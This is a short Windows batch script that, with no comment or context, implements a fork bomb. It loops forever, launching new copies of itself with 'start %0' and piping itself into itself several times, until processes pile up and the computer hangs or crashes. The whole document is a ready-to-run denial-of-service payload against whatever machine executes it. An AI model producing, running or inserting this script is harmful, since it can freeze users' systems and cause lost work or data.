@echo off
:loop
start %0
%0 | %0
%0 | %0 | %0
%0 | %0 | %0 | %0
goto loop
